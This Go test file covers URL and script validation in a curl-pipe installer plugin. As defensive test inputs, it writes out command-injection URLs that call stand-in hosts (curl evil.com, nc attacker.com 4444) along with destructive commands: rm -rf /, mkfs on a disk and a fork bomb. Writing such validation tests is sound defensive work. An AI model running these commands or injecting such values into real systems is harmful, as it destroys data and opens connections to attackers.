package main_test

import (
	"strings"

	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"

	main "github.com/jameswlane/devex/packages/package-manager-curlpipe"
)

var _ = Describe("Curlpipe Validation", func() {
	var plugin *main.CurlpipePlugin

	BeforeEach(func() {
		plugin = main.NewCurlpipePlugin()
	})

	Describe("ValidateURL", func() {
		Context("with valid URLs", func() {
			It("should accept HTTPS URLs", func() {
				err := plugin.ValidateURL("https://example.com/script.sh")
				Expect(err).ToNot(HaveOccurred())
			})

			It("should accept HTTP URLs", func() {
				err := plugin.ValidateURL("http://example.com/script.sh")
				Expect(err).ToNot(HaveOccurred())
			})

			It("should accept URLs with paths and query parameters", func() {
				err := plugin.ValidateURL("https://example.com/path/script.sh?version=latest")
				Expect(err).ToNot(HaveOccurred())
			})
		})

		Context("with invalid URLs", func() {
			It("should reject empty URLs", func() {
				err := plugin.ValidateURL("")
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("URL cannot be empty"))
			})

			It("should reject URLs that are too long", func() {
				longURL := "https://example.com/" + string(make([]byte, 3000)) // Over MaxURLLength
				err := plugin.ValidateURL(longURL)
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("URL too long"))
			})

			It("should reject URLs with invalid schemes", func() {
				invalidSchemes := []string{
					"ftp://example.com/script.sh",
					"file:///etc/passwd",
					"javascript:alert('xss')",
					"data:text/plain,malicious",
				}

				for _, url := range invalidSchemes {
					err := plugin.ValidateURL(url)
					Expect(err).To(HaveOccurred())
				}
			})

			It("should reject malformed URLs", func() {
				malformedURLs := []string{
					"not-a-url",
					"://example.com",
					"https://",
					"https:///script.sh",
				}

				for _, url := range malformedURLs {
					err := plugin.ValidateURL(url)
					Expect(err).To(HaveOccurred())
				}
			})
		})

		Context("with dangerous characters", func() {
			It("should reject URLs with null bytes", func() {
				urlWithNull := "https://example.com/script\x00.sh"
				err := plugin.ValidateURL(urlWithNull)
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("invalid characters"))
			})

			It("should reject URLs with control characters", func() {
				controlChars := []string{
					"https://example.com/script\x01.sh",
					"https://example.com/script\x02.sh",
					"https://example.com/script\x1f.sh",
				}

				for _, url := range controlChars {
					err := plugin.ValidateURL(url)
					Expect(err).To(HaveOccurred())
					Expect(err.Error()).To(ContainSubstring("invalid characters"))
				}
			})
		})
	})

	Describe("ValidateScriptURL", func() {
		Context("with trusted domains", func() {
			It("should validate trusted domain URLs", func() {
				trustedURLs := []string{
					"https://get.docker.com/install.sh",
					"https://sh.rustup.rs/rustup-init.sh",
					"https://raw.githubusercontent.com/user/repo/main/install.sh",
				}

				for _, url := range trustedURLs {
					err := plugin.ValidateScriptURL(url)
					Expect(err).ToNot(HaveOccurred())
				}
			})
		})

		Context("with untrusted domains", func() {
			It("should validate URL format but not trust", func() {
				untrustedURL := "https://untrusted.com/script.sh"
				err := plugin.ValidateScriptURL(untrustedURL)
				Expect(err).ToNot(HaveOccurred()) // Format is valid, trust checked separately
			})
		})

		Context("with malicious URLs", func() {
			It("should reject URLs with command injection attempts", func() {
				maliciousURLs := []string{
					"https://example.com/script.sh; rm -rf /",
					"https://example.com/script.sh && curl evil.com",
					"https://example.com/script.sh | nc attacker.com 4444",
					"https://example.com/script.sh`whoami`",
					"https://example.com/script.sh$(rm -rf /)",
				}

				for _, url := range maliciousURLs {
					err := plugin.ValidateScriptURL(url)
					// Should fail during URL parsing due to invalid characters
					Expect(err).To(HaveOccurred())
				}
			})
		})
	})

	Describe("GetTrustedDomains", func() {
		It("should return a non-empty list of trusted domains", func() {
			domains := plugin.GetTrustedDomains()
			Expect(len(domains)).To(BeNumerically(">", 0))
		})

		It("should include well-known trusted domains", func() {
			domains := plugin.GetTrustedDomains()
			domainSet := make(map[string]bool)
			for _, domain := range domains {
				domainSet[domain] = true
			}

			// Check for some expected trusted domains
			expectedDomains := []string{
				"get.docker.com",
				"sh.rustup.rs",
				"raw.githubusercontent.com",
			}

			for _, expected := range expectedDomains {
				Expect(domainSet[expected]).To(BeTrue(), "Expected trusted domain %s not found", expected)
			}
		})

		It("should not include obviously malicious domains", func() {
			domains := plugin.GetTrustedDomains()

			for _, domain := range domains {
				// Basic sanity checks
				Expect(domain).ToNot(BeEmpty())
				Expect(domain).ToNot(ContainSubstring(" "))
				Expect(domain).ToNot(ContainSubstring(";"))
				Expect(domain).ToNot(ContainSubstring("&"))
				Expect(domain).ToNot(ContainSubstring("|"))

				// Should look like valid domain names
				Expect(domain).To(MatchRegexp(`^[a-zA-Z0-9.-]+$`))
			}
		})
	})

	Describe("Security Boundary Tests", func() {
		Context("URL length validation", func() {
			It("should enforce reasonable URL length limits", func() {
				// Test at boundary - use valid characters instead of null bytes
				borderlineURL := "https://example.com/" + strings.Repeat("a", 1900) // Well under 2048 limit
				err := plugin.ValidateURL(borderlineURL)
				Expect(err).ToNot(HaveOccurred())

				// Test over limit - use valid characters
				tooLongURL := "https://example.com/" + strings.Repeat("a", 3000) // Over 2048 limit
				err = plugin.ValidateURL(tooLongURL)
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("URL too long"))
			})
		})

		Context("protocol restriction", func() {
			It("should only allow HTTP and HTTPS protocols", func() {
				allowedProtocols := []string{"http", "https"}
				for _, protocol := range allowedProtocols {
					url := protocol + "://example.com/script.sh"
					err := plugin.ValidateURL(url)
					Expect(err).ToNot(HaveOccurred())
				}

				disallowedProtocols := []string{"ftp", "file", "gopher", "telnet", "ssh"}
				for _, protocol := range disallowedProtocols {
					url := protocol + "://example.com/script.sh"
					err := plugin.ValidateURL(url)
					Expect(err).To(HaveOccurred())
				}
			})
		})

		Context("host validation", func() {
			It("should require valid hostnames", func() {
				invalidHosts := []string{
					"https:///script.sh",  // No hostname
					"https://",            // Empty hostname
					"https:// /script.sh", // Space in hostname (dangerous char will trigger)
				}

				for _, url := range invalidHosts {
					err := plugin.ValidateURL(url)
					Expect(err).To(HaveOccurred())
				}
			})
		})
	})

	Describe("Edge Cases", func() {
		Context("unicode and special characters", func() {
			It("should handle URLs with encoded characters", func() {
				encodedURL := "https://example.com/script%20name.sh"
				err := plugin.ValidateURL(encodedURL)
				Expect(err).ToNot(HaveOccurred())
			})

			It("should reject URLs with dangerous encoded characters", func() {
				// Test null byte encoded
				dangerousURL := "https://example.com/script%00.sh"
				// This might pass URL parsing but should be caught by validation
				err := plugin.ValidateURL(dangerousURL)
				// The behavior depends on implementation - either parsing fails or validation catches it
				// We just ensure it doesn't crash and returns some result
				_ = err // Don't crash, just verify the method can be called
			})
		})

		Context("boundary conditions", func() {
			It("should handle minimum valid URL", func() {
				minURL := "http://a.b"
				err := plugin.ValidateURL(minURL)
				Expect(err).ToNot(HaveOccurred())
			})

			It("should handle URL at maximum length", func() {
				// Create URL exactly at max length - use valid characters
				baseURL := "https://example.com/"
				padding := 2048 - len(baseURL) - 1
				if padding > 0 {
					maxURL := baseURL + strings.Repeat("a", padding)
					err := plugin.ValidateURL(maxURL)
					Expect(err).ToNot(HaveOccurred())
				}
			})
		})
	})

	Describe("ValidateScriptSecurity", func() {
		Context("with safe scripts", func() {
			It("should accept normal installation scripts", func() {
				safeScript := `#!/bin/bash
set -e
echo "Installing application..."
wget -O app.tar.gz https://example.com/app.tar.gz
tar -xzf app.tar.gz
sudo cp app /usr/local/bin/
echo "Installation complete"`
				err := plugin.ValidateScriptSecurity(safeScript)
				Expect(err).ToNot(HaveOccurred())
			})

			It("should accept scripts with reasonable size", func() {
				reasonableScript := strings.Repeat("echo 'safe command'\n", 100)
				err := plugin.ValidateScriptSecurity(reasonableScript)
				Expect(err).ToNot(HaveOccurred())
			})
		})

		Context("with dangerous scripts", func() {
			It("should reject destructive file operations", func() {
				dangerousScript := "rm -rf /"
				err := plugin.ValidateScriptSecurity(dangerousScript)
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("destructive"))
			})

			It("should reject disk formatting commands", func() {
				dangerousScript := "mkfs.ext4 /dev/sda1"
				err := plugin.ValidateScriptSecurity(dangerousScript)
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("filesystem format"))
			})

			It("should reject fork bombs", func() {
				forkBomb := ":(){ :|:& };:"
				err := plugin.ValidateScriptSecurity(forkBomb)
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("fork bomb"))
			})

			It("should reject scripts with excessive command substitution", func() {
				obfuscatedScript := strings.Repeat("$(echo test)", 60)
				err := plugin.ValidateScriptSecurity(obfuscatedScript)
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("excessive command substitution"))
			})

			It("should reject oversized scripts", func() {
				// Create a script larger than 10MB
				oversizedScript := strings.Repeat("echo 'large script content here'\n", 400000)
				err := plugin.ValidateScriptSecurity(oversizedScript)
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("exceeds maximum allowed size"))
			})

			It("should reject binary content", func() {
				binaryScript := "#!/bin/bash\necho 'start'\x00\x01\x02\x03\x04\x05\x06\x07\necho 'end'"
				err := plugin.ValidateScriptSecurity(binaryScript)
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("non-printable characters"))
			})
		})

		Context("with suspicious but non-fatal scripts", func() {
			It("should warn about but allow privilege escalation patterns", func() {
				suspiciousScript := "sudo su -"
				err := plugin.ValidateScriptSecurity(suspiciousScript)
				Expect(err).ToNot(HaveOccurred()) // Should warn but not fail
			})

			It("should warn about but allow network activity", func() {
				suspiciousScript := "curl https://example.com/script.sh | bash"
				err := plugin.ValidateScriptSecurity(suspiciousScript)
				Expect(err).ToNot(HaveOccurred()) // Should warn but not fail
			})
		})

		Context("with empty or invalid content", func() {
			It("should reject empty scripts", func() {
				err := plugin.ValidateScriptSecurity("")
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("empty"))
			})
		})
	})
})
